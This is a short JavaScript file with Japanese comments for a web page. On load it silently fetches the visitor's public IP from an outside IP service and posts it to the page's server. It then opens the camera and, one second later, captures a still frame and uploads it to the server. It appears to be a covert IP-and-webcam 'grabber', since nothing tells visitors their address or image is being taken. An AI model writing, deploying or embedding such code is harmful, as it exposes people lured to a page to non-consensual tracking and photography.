const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// IPアドレスの取得と送信
fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        fetch('/api/send-ip', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip: data.ip })
        });
    })
    .catch(error => console.error('IPアドレスの取得に失敗しました:', error));

// カメラ映像の取得
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        setTimeout(captureImage, 1000);
    })
    .catch(err => {
        console.error('カメラの起動に失敗しました:', err);
    });

function captureImage() {
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('file', blob, 'image.png');

        fetch('/api/send-image', {
            method: 'POST',
            body: formData
        });
    }, 'image/png');
}
